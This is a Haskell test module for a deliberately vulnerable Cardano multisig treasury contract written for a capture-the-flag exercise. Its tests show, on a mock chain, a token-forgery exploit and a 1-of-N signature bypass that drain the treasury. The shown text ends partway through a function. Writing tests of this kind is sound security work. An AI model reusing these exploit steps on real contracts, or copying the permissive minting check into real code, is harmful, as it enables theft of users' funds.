{-# LANGUAGE DeriveAnyClass #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE LambdaCase #-}
{-# LANGUAGE NamedFieldPuns #-}
{-# LANGUAGE NumericUnderscores #-}
{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE TemplateHaskell #-}
{-# LANGUAGE TypeApplications #-}
{-# LANGUAGE TypeFamilies #-}
{-# LANGUAGE ViewPatterns #-}

{- | Tests for the Aiken-compiled CTF Multisig Treasury V2 validator using TestingInterface.

This module demonstrates property-based testing of a vulnerable multisig contract
with a validation token mechanism that is EXPLOITABLE.

== Vulnerability: Token Forgery ==

The v2 multisig adds a "validation token" requirement - to Use the multisig,
a validation token must be present (via minting) in the transaction. The idea
is that the token proves the proposal went through proper signing.

BUT the minting policy is too permissive! The 'MintValidation' redeemer only
checks that SOMEONE signed the transaction:

@
MintValidation -> {
  // VULNERABILITY: Anyone who signs can mint!
  list.length(self.extra_signatories) > 0
}
@

An attacker can:
1. Mint their own validation token with MintValidation
2. Create a multisig UTxO with the token and their own signature in signed_users
3. Use it to drain the treasury immediately

The spend validator checks:
- Sign: Any required signer signed the tx (same as v1)
- Use: Any signed_user signed AND has_any_minted_tokens (token must be minted)

The mint validator checks:
- MintValidation: Just that someone signed (VULNERABLE!)
- BurnValidation: Always True

The Aiken types encode as:
- @Datum { release_value: Int, beneficiary: Address, required_signers: List<VerificationKeyHash>, signed_users: List<VerificationKeyHash> }@
- @Spend Redeemer: Sign | Use@ = @Constr 0 [] | Constr 1 []@
- @Mint Redeemer: MintValidation | BurnValidation@ = @Constr 0 [] | Constr 1 []@
-}
module AikenMultisigTreasuryV2Spec (
  -- * TestingInterface model
  MultisigV2Model (..),

  -- * Test tree
  aikenMultisigTreasuryV2Tests,

  -- * Standalone threat model tests
  propMultisigV2TokenForgeryExploit,
) where

import Cardano.Api qualified as C
import Control.Lens ((^.))
import Control.Monad (void)
import Control.Monad.Except (MonadError, runExceptT)
import Control.Monad.IO.Class (MonadIO (..))
import Control.Monad.Trans (lift)
import Convex.Aiken.Blueprint (Blueprint (..))
import Convex.Aiken.Blueprint qualified as Blueprint
import Convex.BuildTx (MonadBuildTx, execBuildTx)
import Convex.BuildTx qualified as BuildTx
import Convex.Class (MonadMockchain, getUtxo)
import Convex.CoinSelection (BalanceTxError, ChangeOutputPosition (TrailingChange))
import Convex.MockChain (fromLedgerUTxO, runMockchain0IOWith)
import Convex.MockChain.CoinSelection (balanceAndSubmit, tryBalanceAndSubmit)
import Convex.MockChain.Defaults qualified as Defaults
import Convex.MockChain.Utils (Options (Options, params), mockchainSucceeds)
import Convex.NodeParams (ledgerProtocolParameters)
import Convex.PlutusLedger.V1 (transAddressInEra)
import Convex.TestingInterface (
  RunOptions (mcOptions),
  TestingInterface (..),
  propRunActionsWithOptions,
 )
import Convex.ThreatModel (ThreatModelEnv (..), runThreatModelM)
import Convex.ThreatModel.Cardano.Api (dummyTxId)

import Convex.ThreatModel.UnprotectedScriptOutput (unprotectedScriptOutput)
import Convex.Utils (failOnError)
import Convex.Wallet (Wallet, addressInEra, verificationKeyHash)
import Convex.Wallet.MockWallet qualified as Wallet
import Data.Map qualified as Map
import Data.Maybe (mapMaybe)

import Paths_convex_testing_interface qualified as Pkg
import PlutusLedgerApi.V1 qualified as PV1
import PlutusTx qualified
import PlutusTx.Builtins qualified as PlutusTx

import System.IO.Unsafe (unsafePerformIO)
import Test.QuickCheck.Monadic (monadicIO, monitor, run)
import Test.Tasty (TestTree, testGroup)
import Test.Tasty.HUnit (assertFailure, testCase)
import Test.Tasty.QuickCheck (
  Property,
  counterexample,
  testProperty,
 )
import Test.Tasty.QuickCheck qualified as QC

-- ----------------------------------------------------------------------------
-- Multisig V2 Datum and Redeemer types (wire-compatible with Aiken)
-- ----------------------------------------------------------------------------

{- | The datum stored at the multisig_treasury_v2 script address.

Same as V1:
@Constr 0 [release_value, beneficiary_address, required_signers_list, signed_users_list]@
-}
data MultisigV2Datum = MultisigV2Datum
  { mv2ReleaseValue :: Integer
  -- ^ Amount to release (in lovelace)
  , mv2Beneficiary :: PV1.Address
  -- ^ Plutus address of beneficiary
  , mv2RequiredSigners :: [PlutusTx.BuiltinByteString]
  -- ^ List of required signer pubkey hashes
  , mv2SignedUsers :: [PlutusTx.BuiltinByteString]
  -- ^ List of users who have signed so far
  }
  deriving stock (Eq, Show)

{- | Actions that can be performed on the multisig treasury spend validator.

Aiken encodes as: @Sign = Constr 0 []@, @Use = Constr 1 []@
-}
data MultisigV2SpendRedeemer = SignV2 | UseV2
  deriving stock (Eq, Show)

{- | Redeemers for the validation token minting policy.

Aiken encodes as: @MintValidation = Constr 0 []@, @BurnValidation = Constr 1 []@
-}
data ValidationMintRedeemer = MintValidation | BurnValidation
  deriving stock (Eq, Show)

-- Use TH for ToData/FromData/UnsafeFromData instances
PlutusTx.unstableMakeIsData ''MultisigV2Datum
PlutusTx.unstableMakeIsData ''MultisigV2SpendRedeemer
PlutusTx.unstableMakeIsData ''ValidationMintRedeemer

-- ----------------------------------------------------------------------------
-- Script loading
-- ----------------------------------------------------------------------------

-- | Load the Aiken "ctf_multisig_treasury_v2" spend validator from the embedded blueprint
loadMultisigV2SpendScript :: IO (C.PlutusScript C.PlutusScriptV3)
loadMultisigV2SpendScript = do
  path <- Pkg.getDataFileName "test/data/aiken-contracts-example.json"
  Blueprint{validators} <- Blueprint.loadFromFile path >>= either fail pure
  case Map.lookup "ctf_multisig_treasury_v2.ctf_multisig_treasury_v2.spend" validators of
    Just (C.ScriptInAnyLang (C.PlutusScriptLanguage C.PlutusScriptV3) (C.PlutusScript _ ps)) ->
      pure ps
    _ -> fail "ctf_multisig_treasury_v2.ctf_multisig_treasury_v2.spend not found in Aiken blueprint"

-- | Load the Aiken "ctf_multisig_treasury_v2" mint policy from the embedded blueprint
loadMultisigV2MintScript :: IO (C.PlutusScript C.PlutusScriptV3)
loadMultisigV2MintScript = do
  path <- Pkg.getDataFileName "test/data/aiken-contracts-example.json"
  Blueprint{validators} <- Blueprint.loadFromFile path >>= either fail pure
  case Map.lookup "ctf_multisig_treasury_v2.ctf_multisig_treasury_v2.mint" validators of
    Just (C.ScriptInAnyLang (C.PlutusScriptLanguage C.PlutusScriptV3) (C.PlutusScript _ ps)) ->
      pure ps
    _ -> fail "ctf_multisig_treasury_v2.ctf_multisig_treasury_v2.mint not found in Aiken blueprint"

{- | Top-level binding for the Aiken CTF Multisig Treasury V2 spend script.

We use 'unsafePerformIO' here because 'TestingInterface.initialState' is a
pure value (not a function), so we cannot pass the script in dynamically.
-}
{-# NOINLINE multisigV2SpendScript #-}
multisigV2SpendScript :: C.PlutusScript C.PlutusScriptV3
multisigV2SpendScript = unsafePerformIO loadMultisigV2SpendScript

{-# NOINLINE multisigV2MintScript #-}
multisigV2MintScript :: C.PlutusScript C.PlutusScriptV3
multisigV2MintScript = unsafePerformIO loadMultisigV2MintScript

-- | Helper to wrap PlutusScript as Script (for hashScript)
plutusScript :: C.PlutusScript C.PlutusScriptV3 -> C.Script C.PlutusScriptV3
plutusScript = C.PlutusScript C.PlutusScriptV3

-- | Hash of the multisig_treasury_v2 spend script
multisigV2SpendScriptHash :: C.ScriptHash
multisigV2SpendScriptHash = C.hashScript (plutusScript multisigV2SpendScript)

-- | Address of the multisig_treasury_v2 script on the default network
multisigV2Address :: C.AddressInEra C.ConwayEra
multisigV2Address =
  C.makeShelleyAddressInEra
    C.shelleyBasedEra
    Defaults.networkId
    (C.PaymentCredentialByScript multisigV2SpendScriptHash)
    C.NoStakeAddress

-- | Asset name for validation tokens (empty for simplicity)
validationTokenName :: C.AssetName
validationTokenName = C.UnsafeAssetName ""

-- ----------------------------------------------------------------------------
-- Helper to convert wallet pubkey hash to BuiltinByteString
-- ----------------------------------------------------------------------------

-- | Get wallet pubkey hash as BuiltinByteString
walletPkhBytes :: Wallet -> PlutusTx.BuiltinByteString
walletPkhBytes w = PlutusTx.toBuiltin $ C.serialiseToRawBytes (verificationKeyHash w)

-- | Get wallet Plutus address
walletPlutusAddress :: Wallet -> PV1.Address
walletPlutusAddress w =
  let addr = addressInEra @C.ConwayEra Defaults.networkId w
   in case transAddressInEra addr of
        Just a -> a
        Nothing -> error "Failed to convert wallet address to Plutus address"

-- ----------------------------------------------------------------------------
-- Transaction builders
-- ----------------------------------------------------------------------------

{- | Initialize the multisig treasury v2 by paying to the script with initial datum.

Creates a 2-of-2 multisig with w1 and w2 as required signers.
-}
initMultisigV2
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> Wallet
  -- ^ Beneficiary wallet
  -> C.Lovelace
  -- ^ Initial value to lock
  -> m ()
initMultisigV2 networkId beneficiary initialValue = do
  let beneficiaryAddr = walletPlutusAddress beneficiary
      -- 2-of-2 multisig: w1 and w2 must both sign
      requiredSigners = [walletPkhBytes Wallet.w1, walletPkhBytes Wallet.w2]
      datum =
        MultisigV2Datum
          { mv2ReleaseValue = 10_000_000 -- Release 10 ADA when fully signed
          , mv2Beneficiary = beneficiaryAddr
          , mv2RequiredSigners = requiredSigners
          , mv2SignedUsers = [] -- No one has signed yet
          }
  BuildTx.payToScriptInlineDatum
    networkId
    multisigV2SpendScriptHash
    datum
    C.NoStakeAddress
    (C.lovelaceToValue initialValue)

{- | Sign the multisig v2: spend the UTxO with Sign redeemer and create continuation.

This is the "correct" off-chain code that creates a proper continuation.
-}
signMultisigV2
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> C.TxIn
  -- ^ The script UTxO to spend
  -> MultisigV2Datum
  -- ^ Current datum
  -> C.Value
  -- ^ Current value
  -> Wallet
  -- ^ The wallet signing
  -> m ()
signMultisigV2 networkId txIn oldDatum currentValue signer = do
  let signerPkh = walletPkhBytes signer
      signerPkhC = verificationKeyHash signer
      -- Add signer to signed_users list
      newDatum =
        oldDatum
          { mv2SignedUsers = signerPkh : mv2SignedUsers oldDatum
          }
      witness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            multisigV2SpendScript
            (C.ScriptDatumForTxIn Nothing)
            SignV2
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn witness
  BuildTx.addRequiredSignature signerPkhC
  -- Create continuation output with updated datum
  BuildTx.payToScriptInlineDatum
    networkId
    multisigV2SpendScriptHash
    newDatum
    C.NoStakeAddress
    currentValue

{- | Use the multisig v2 to release funds (normal flow with proper token minting).

This spends the script UTxO with Use redeemer AND mints a validation token.
For v2, the Use action requires minting tokens to be present.
-}
useMultisigV2
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => C.TxIn
  -- ^ The script UTxO to spend
  -> C.AddressInEra era
  -- ^ Beneficiary address
  -> C.Lovelace
  -- ^ Amount to release
  -> Wallet
  -- ^ Wallet providing the signature (must be in signed_users)
  -> m ()
useMultisigV2 txIn beneficiaryAddr releaseValue signer = do
  let signerPkhC = verificationKeyHash signer
      spendWitness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            multisigV2SpendScript
            (C.ScriptDatumForTxIn Nothing)
            UseV2
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn spendWitness
  BuildTx.addRequiredSignature signerPkhC
  BuildTx.payToAddress beneficiaryAddr (C.lovelaceToValue releaseValue)
  -- Mint a validation token (required for Use to succeed)
  BuildTx.mintPlutus multisigV2MintScript MintValidation validationTokenName 1

{- | EXPLOIT: Full token forgery attack - create fake UTxO and drain.

The full exploit:
1. Create a new UTxO at the script with attacker as sole signed_user
2. Mint a validation token (anyone can do this!)
3. Use that UTxO to drain (attacker is in their own signed_users list)

This is done in two transactions for clarity, but could be done in one.
-}
createFakeDatumAndUse
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> C.TxIn
  -- ^ A fake UTxO created by the attacker with their datum
  -> C.Value
  -- ^ Value in the fake UTxO
  -> Wallet
  -- ^ Attacker wallet
  -> m ()
createFakeDatumAndUse _networkId txIn _value attacker = do
  let attackerPkhC = verificationKeyHash attacker
      attackerAddr = addressInEra @era Defaults.networkId attacker

      spendWitness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            multisigV2SpendScript
            (C.ScriptDatumForTxIn Nothing)
            UseV2

  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn spendWitness
  BuildTx.addRequiredSignature attackerPkhC

  -- Mint validation token (the vulnerable part!)
  BuildTx.mintPlutus multisigV2MintScript MintValidation validationTokenName 1

  -- Drain to attacker
  BuildTx.payToAddress attackerAddr (C.lovelaceToValue 10_000_000)

{- | Create a multisig UTxO with a custom datum (for exploit setup).

The attacker creates a UTxO at the script address with themselves as the only
signer in signed_users. Then they can Use it immediately.
-}
createAttackerDatum
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> Wallet
  -- ^ Attacker who will be the sole signed_user
  -> C.Lovelace
  -- ^ Value to lock
  -> m ()
createAttackerDatum networkId attacker value = do
  let attackerPkh = walletPkhBytes attacker
      attackerAddr = walletPlutusAddress attacker
      -- Datum where attacker is ALREADY in signed_users
      datum =
        MultisigV2Datum
          { mv2ReleaseValue = fromIntegral value
          , mv2Beneficiary = attackerAddr
          , mv2RequiredSigners = [attackerPkh] -- Attacker is the only required signer
          , mv2SignedUsers = [attackerPkh] -- Attacker is already "signed"
          }
  BuildTx.payToScriptInlineDatum
    networkId
    multisigV2SpendScriptHash
    datum
    C.NoStakeAddress
    (C.lovelaceToValue value)

-- ----------------------------------------------------------------------------
-- Helper to find script UTxOs
-- ----------------------------------------------------------------------------

-- | Find all UTxOs at the multisig_treasury_v2 script address
findMultisigV2Utxos
  :: (MonadMockchain C.ConwayEra m)
  => m [(C.TxIn, C.Value, MultisigV2Datum)]
findMultisigV2Utxos = do
  utxoSet <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo
  let C.UTxO utxos = utxoSet
      scriptUtxos = Map.filter (\(C.TxOut addr _ _ _) -> addr == multisigV2Address) utxos
  pure $ mapMaybe extractData $ Map.toList scriptUtxos
 where
  extractData (txIn, C.TxOut _ txOutValue datum _) =
    case txOutValue of
      C.TxOutValueShelleyBased _ val ->
        let value = C.fromMaryValue val
            d = case datum of
              C.TxOutDatumInline _ scriptData ->
                PlutusTx.unsafeFromBuiltinData @MultisigV2Datum
                  (PlutusTx.dataToBuiltinData $ C.toPlutusData $ C.getScriptData scriptData)
              _ -> error "Expected inline datum"
         in Just (txIn, value, d)
      C.TxOutValueByron _ -> Nothing

-- ----------------------------------------------------------------------------
-- Unit tests
-- ----------------------------------------------------------------------------

aikenMultisigV2UnitTests :: TestTree
aikenMultisigV2UnitTests =
  testGroup
    "ctf multisig_treasury_v2 unit tests"
    [ testCase "initialize multisig v2" $
        mockchainSucceeds $
          failOnError $ do
            let txBody = execBuildTx $ initMultisigV2 @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
            void $ tryBalanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
            -- Verify UTxO exists at script address
            result <- findMultisigV2Utxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((_, _, datum) : _) -> do
                liftIO $
                  if length (mv2RequiredSigners datum) == 2 && null (mv2SignedUsers datum)
                    then pure ()
                    else assertFailure $ "Wrong datum state: " ++ show datum
    , testCase "normal flow: init -> sign(w1) -> sign(w2) -> use with token" $
        mockchainSucceeds $
          failOnError $ do
            -- Initialize multisig with w1 as beneficiary
            let initTxBody = execBuildTx $ initMultisigV2 @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

            -- Sign with w1
            result1 <- findMultisigV2Utxos
            case result1 of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn1, value1, datum1) : _) -> do
                let sign1TxBody = execBuildTx $ signMultisigV2 @C.ConwayEra Defaults.networkId txIn1 datum1 value1 Wallet.w1
                _ <- tryBalanceAndSubmit mempty Wallet.w1 sign1TxBody TrailingChange []

                -- Sign with w2
                result2 <- findMultisigV2Utxos
                case result2 of
                  [] -> liftIO $ assertFailure "Expected UTxO after first sign"
                  ((txIn2, value2, datum2) : _) -> do
                    -- Verify w1 is now in signed_users
                    liftIO $
                      if length (mv2SignedUsers datum2) == 1
                        then pure ()
                        else assertFailure $ "Expected 1 signed user, got: " ++ show (mv2SignedUsers datum2)

                    let sign2TxBody = execBuildTx $ signMultisigV2 @C.ConwayEra Defaults.networkId txIn2 datum2 value2 Wallet.w2
                    _ <- tryBalanceAndSubmit mempty Wallet.w2 sign2TxBody TrailingChange []

                    -- Use the multisig (with validation token)
                    result3 <- findMultisigV2Utxos
                    case result3 of
                      [] -> liftIO $ assertFailure "Expected UTxO after second sign"
                      ((txIn3, _, datum3) : _) -> do
                        -- Verify both are in signed_users
                        liftIO $
                          if length (mv2SignedUsers datum3) == 2
                            then pure ()
                            else assertFailure $ "Expected 2 signed users, got: " ++ show (mv2SignedUsers datum3)

                        let beneficiaryAddr = addressInEra Defaults.networkId Wallet.w1
                            useTxBody = execBuildTx $ useMultisigV2 @C.ConwayEra txIn3 beneficiaryAddr 10_000_000 Wallet.w1
                        void $ tryBalanceAndSubmit mempty Wallet.w1 useTxBody TrailingChange []

                        -- Verify UTxO is gone
                        result4 <- findMultisigV2Utxos
                        case result4 of
                          [] -> pure ()
                          _ -> liftIO $ assertFailure "Expected no UTxO after use"
    , testCase "EXPLOIT: Token forgery - attacker mints token and drains treasury" $
        -- This demonstrates the TOKEN FORGERY vulnerability!
        -- The attacker creates their own UTxO with a favorable datum, then drains it.
        mockchainSucceeds $
          failOnError $ do
            -- Step 1: Attacker creates a UTxO at the script with themselves as signed_user
            -- (In a real scenario, this might be done via other means or the attacker
            -- might already be a required_signer who can manipulate the state)
            let createFakeTxBody = execBuildTx $ createAttackerDatum @C.ConwayEra Defaults.networkId Wallet.w3 20_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w3 createFakeTxBody TrailingChange []

            -- Step 2: Find the attacker's UTxO
            result <- findMultisigV2Utxos
            case result of
              [] -> liftIO $ assertFailure "Expected attacker's UTxO at script address"
              ((txIn, value, _datum) : _) -> do
                -- Step 3: Attacker uses the UTxO, minting a validation token
                -- The minting policy allows ANYONE who signs to mint!
                let exploitTxBody = execBuildTx $ createFakeDatumAndUse @C.ConwayEra Defaults.networkId txIn value Wallet.w3
                void $ tryBalanceAndSubmit mempty Wallet.w3 exploitTxBody TrailingChange []

                -- Step 4: Verify the UTxO was drained
                result2 <- findMultisigV2Utxos
                case result2 of
                  [] -> pure () -- Exploit succeeded - treasury drained!
                  _ -> liftIO $ assertFailure "Expected UTxO to be drained (exploit should have succeeded)"
    , testCase "exploit: 1-of-N signature vulnerability (inherited from v1)" $
        -- V2 still has the same 1-of-N vulnerability as V1
        mockchainSucceeds $
          failOnError $ do
            -- Create UTxO with w1 in signed_users
            let beneficiaryAddr = walletPlutusAddress Wallet.w1
                datum =
                  MultisigV2Datum
                    { mv2ReleaseValue = 10_000_000
                    , mv2Beneficiary = beneficiaryAddr
                    , mv2RequiredSigners = [walletPkhBytes Wallet.w1, walletPkhBytes Wallet.w2]
                    , mv2SignedUsers = [walletPkhBytes Wallet.w1] -- Only w1 has "signed"
                    }
                initTxBody =
                  execBuildTx $
                    BuildTx.payToScriptInlineDatum
                      Defaults.networkId
                      multisigV2SpendScriptHash
                      datum
                      C.NoStakeAddress
                      (C.lovelaceToValue 20_000_000)
            _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

            -- Try to Use with only w1 signing (w2 never signed!)
            result <- findMultisigV2Utxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn, _, _) : _) -> do
                let beneficiaryAddrC = addressInEra Defaults.networkId Wallet.w1
                    useTxBody = execBuildTx $ useMultisigV2 @C.ConwayEra txIn beneficiaryAddrC 10_000_000 Wallet.w1
                -- This succeeds even though w2 never signed!
                void $ tryBalanceAndSubmit mempty Wallet.w1 useTxBody TrailingChange []

                -- Verify UTxO is gone (exploit succeeded!)
                result2 <- findMultisigV2Utxos
                case result2 of
                  [] -> pure () -- Exploit worked!
                  _ -> liftIO $ assertFailure "Exploit should have succeeded"
    ]

-- ----------------------------------------------------------------------------
-- Standalone Threat Model Tests
-- ----------------------------------------------------------------------------

{- | Test that the multisig v2 contract is vulnerable to token forgery.

This demonstrates the core vulnerability: anyone who can sign a transaction
can mint validation tokens. The minting policy only checks:
@list.length(self.extra_signatories) > 0@

This is trivially satisfied by any signed transaction!

The test:
1. Attacker creates a UTxO at the script with themselves as signed_user
2. Attacker mints a validation token (trivially possible!)
3. Attacker uses the UTxO to drain funds

This test returns True when the vulnerability is confirmed.
-}
propMultisigV2TokenForgeryExploit :: RunOptions -> Property
propMultisigV2TokenForgeryExploit opts = monadicIO $ do
  let Options{params} = mcOptions opts

  result <- run $ runMockchain0IOWith Wallet.initialUTxOs params $ runExceptT $ do
    -- Attacker (w3) creates a UTxO at the script with themselves as signed_user
    let createFakeTxBody = execBuildTx $ createAttackerDatum @C.ConwayEra Defaults.networkId Wallet.w3 20_000_000
    _ <- tryBalanceAndSubmit mempty Wallet.w3 createFakeTxBody TrailingChange []

    -- Capture UTxO before exploit
    utxoBefore <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo

    -- Attacker drains using forged token
    msResult <- findMultisigV2Utxos
    case msResult of
      [] -> fail "Expected UTxO at script address"
      ((txIn, value, _) : _) -> do
        let exploitTxBody = execBuildTx $ createFakeDatumAndUse @C.ConwayEra Defaults.networkId txIn value Wallet.w3
        exploitTx <- tryBalanceAndSubmit mempty Wallet.w3 exploitTxBody TrailingChange []
        pure (exploitTx, utxoBefore)

  case result of
    (Left err, _) -> do
      monitor (counterexample $ "Mockchain error: " ++ show err)
      -- If the transaction FAILED, then the script is NOT vulnerable (which would be good!)
      pure $ QC.property False
    (Right (_, _), _finalState) -> do
      monitor (counterexample "Testing multisig v2 for token forgery vulnerability")
      -- The exploit SUCCEEDED - vulnerability confirmed!
      pure $ QC.property True

{- | Run a scenario for threat model testing with continuation output.

This creates a proper Sign transaction that has a continuation output.
-}
multisigV2ContinuationScenario
  :: ( MonadMockchain C.ConwayEra m
     , MonadError (BalanceTxError C.ConwayEra) m
     , MonadFail m
     )
  => m (C.Tx C.ConwayEra, C.UTxO C.ConwayEra)
multisigV2ContinuationScenario = do
  -- Initialize multisig
  let initTxBody = execBuildTx $ initMultisigV2 @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
  _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

  -- Capture UTxO BEFORE signing (for threat model)
  utxoBefore <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo

  -- Sign with w1 (creating continuation)
  result <- findMultisigV2Utxos
  case result of
    [] -> fail "Expected UTxO at script address"
    ((txIn, value, datum) : _) -> do
      let signTxBody = execBuildTx $ signMultisigV2 @C.ConwayEra Defaults.networkId txIn datum value Wallet.w1
      signTx <- tryBalanceAndSubmit mempty Wallet.w1 signTxBody TrailingChange []
      pure (signTx, utxoBefore)

{- | Test unprotectedScriptOutput threat model on the multisig v2.

The Sign action creates a continuation output.
-}
propMultisigV2UnprotectedOutput :: RunOptions -> Property
propMultisigV2UnprotectedOutput opts = QC.expectFailure $ monadicIO $ do
  let Options{params} = mcOptions opts

  result <- run $ runMockchain0IOWith Wallet.initialUTxOs params $ runExceptT $ do
    (tx, utxo) <- multisigV2ContinuationScenario

    let pparams' = params ^. ledgerProtocolParameters
        env =
          ThreatModelEnv
            { currentTx = tx
            , currentUTxOs = utxo
            , pparams = pparams'
            }

    -- Run the threat model INSIDE MockchainT with full Phase 1 + Phase 2 validation
    lift $ runThreatModelM Wallet.w1 unprotectedScriptOutput [env]

  case result of
    (Left err, _) -> do
      monitor (counterexample $ "Mockchain error: " ++ show err)
      pure $ QC.property False
    (Right prop, _finalState) -> do
      monitor (counterexample "Testing multisig v2 for unprotected script output vulnerability")
      pure prop

-- ----------------------------------------------------------------------------
-- TestingInterface instance
-- ----------------------------------------------------------------------------

-- | Model state for the CTF Multisig Treasury V2 contract
data MultisigV2Model = MultisigV2Model
  { mmv2Initialized :: Bool
  -- ^ Whether the multisig has been created
  , mmv2TxIn :: Maybe C.TxIn
  -- ^ The UTxO at the script
  , mmv2Value :: C.Lovelace
  -- ^ Value locked in the multisig
  , mmv2RequiredSigners :: [PlutusTx.BuiltinByteString]
  -- ^ List of required signers
  , mmv2SignedUsers :: [PlutusTx.BuiltinByteString]
  -- ^ List of users who have signed
  , mmv2Beneficiary :: Maybe PV1.Address
  -- ^ Beneficiary address
  , mmv2ReleaseValue :: Integer
  -- ^ Amount to release
  , mmv2HasBeenUsed :: Bool
  -- ^ Once used, sequence is done
  }
  deriving stock (Show, Eq)

-- | Which signer to use (w1 or w2)
data SignerChoice = Signer1 | Signer2
  deriving stock (Show, Eq)

signerToWallet :: SignerChoice -> Wallet
signerToWallet Signer1 = Wallet.w1
signerToWallet Signer2 = Wallet.w2

instance TestingInterface MultisigV2Model where
  -- Actions for Multisig V2
  data Action MultisigV2Model
    = InitMultisigV2
    | -- \^ Initialize the multisig (2-of-2 with w1, w2)
      SignMultisigV2 SignerChoice
    | -- \^ Sign with a wallet
      UseMultisigV2
    | -- \^ Use the multisig (release funds) - proper flow
      ForgeTokenAndUse
    -- \^ EXPLOIT: attacker forges token and drains
    deriving stock (Show, Eq)

  initialState =
    MultisigV2Model
      { mmv2Initialized = False
      , mmv2TxIn = Nothing
      , mmv2Value = 0
      , mmv2RequiredSigners = []
      , mmv2SignedUsers = []
      , mmv2Beneficiary = Nothing
      , mmv2ReleaseValue = 0
      , mmv2HasBeenUsed = False
      }

  -- Generate actions based on state
  arbitraryAction model
    | mmv2HasBeenUsed model = pure InitMultisigV2 -- precondition will reject
    | not (mmv2Initialized model) = pure InitMultisigV2
    | length (mmv2SignedUsers model) < 2 =
        QC.frequency
          [ (90, SignMultisigV2 <$> pickUnsignedSigner model)
          , (5, pure UseMultisigV2) -- Occasionally test 1-of-N exploit
          , (5, pure ForgeTokenAndUse) -- Occasionally test token forgery
          ]
    | otherwise =
        QC.frequency
          [ (1, pure UseMultisigV2)
          , (1, pure ForgeTokenAndUse)
          ]
   where
    pickUnsignedSigner m
      | walletPkhBytes Wallet.w1 `notElem` mmv2SignedUsers m = pure Signer1
      | walletPkhBytes Wallet.w2 `notElem` mmv2SignedUsers m = pure Signer2
      | otherwise = QC.elements [Signer1, Signer2]

  precondition model InitMultisigV2 = not (mmv2Initialized model) && not (mmv2HasBeenUsed model)
  precondition model (SignMultisigV2 sc) =
    mmv2Initialized model && walletPkhBytes (signerToWallet sc) `notElem` mmv2SignedUsers model
  precondition model UseMultisigV2 =
    mmv2Initialized model && not (null (mmv2SignedUsers model))
  precondition model ForgeTokenAndUse =
    mmv2Initialized model -- Attacker can attempt exploit anytime after init

  nextState model action = case action of
    InitMultisigV2 ->
      model
        { mmv2Initialized = True
        , mmv2TxIn = Just (C.TxIn dummyTxId (C.TxIx 0))
        , mmv2Value = 20_000_000
        , mmv2RequiredSigners = [walletPkhBytes Wallet.w1, walletPkhBytes Wallet.w2]
        , mmv2SignedUsers = []
        , mmv2Beneficiary = Just (walletPlutusAddress Wallet.w1)
        , mmv2ReleaseValue = 10_000_000
        , mmv2HasBeenUsed = False
        }
    SignMultisigV2 sc ->
      model
        { mmv2SignedUsers = walletPkhBytes (signerToWallet sc) : mmv2SignedUsers model
        }
    UseMultisigV2 ->
      model
        { mmv2Initialized = False
        , mmv2TxIn = Nothing
        , mmv2Value = 0
        , mmv2RequiredSigners = []
        , mmv2SignedUsers = []
        , mmv2Beneficiary = Nothing
        , mmv2ReleaseValue = 0
        , mmv2HasBeenUsed = True
        }
    ForgeTokenAndUse ->
      -- Exploit drains the treasury
      model
        { mmv2Initialized = False
        , mmv2TxIn = Nothing
        , mmv2Value = 0
        , mmv2RequiredSigners = []
        , mmv2SignedUsers = []
        , mmv2Beneficiary = Nothing
        , mmv2ReleaseValue = 0
        , mmv2HasBeenUsed = True
        }

  perform _model action = case action of
    InitMultisigV2 -> do
      let txBody = execBuildTx $ initMultisigV2 @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
      runExceptT (balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []) >>= \case
        Left err -> fail $ "Failed to initialize multisig v2: " ++ show err
        Right _ -> pure ()
    SignMultisigV2 sc -> do
      let w = signerToWallet sc
      result <- findMultisigV2Utxos
      case result of
        [] -> fail "No UTxO found at multisig v2 script address"
        ((txIn, value, datum) : _) -> do
          let txBody = execBuildTx $ signMultisigV2 @C.ConwayEra Defaults.networkId txIn datum value w
          runExceptT (balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []) >>= \case
            Left err -> fail $ "Failed to sign multisig v2: " ++ show err
            Right _ -> pure ()
    UseMultisigV2 -> do
      result <- findMultisigV2Utxos
      case result of
        [] -> fail "No UTxO found at multisig v2 script address for use"
        ((txIn, _, datum) : _) -> do
          let signer =
                if walletPkhBytes Wallet.w1 `elem` mv2SignedUsers datum
                  then Wallet.w1
                  else Wallet.w2
              beneficiaryAddr = addressInEra Defaults.networkId Wallet.w1
